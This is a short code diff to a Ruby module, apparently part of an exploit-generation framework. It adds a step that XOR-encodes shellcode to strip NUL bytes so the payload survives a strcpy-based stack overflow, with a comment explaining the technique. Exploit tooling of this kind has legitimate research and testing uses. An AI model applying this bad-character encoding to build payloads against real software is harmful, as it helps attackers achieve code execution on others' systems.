@@ -108,6 +108,12 @@ module Lictor
             end
             AugureProfiler::Shellcode.generate(shellcode_klass(arch), stub, path: path)
           end
+          # The shellcode travels through a strcpy (the vuln=sof copy):
+          # the copied string stops at the first NUL, so a raw stub dies
+          # in the channel. The Encoder's xor wrapper (the decoder is
+          # zero-free by construction, the data is xor-keyed) crosses it;
+          # the decoded stub materializes in place at run time.
+          sc = AugureProfiler::Encoder.encode(sc.b, badchars: [0x00], arch: arch)[:bytes]
           body << sc.b
         when "chain"
           slot[1..].each do |ref|
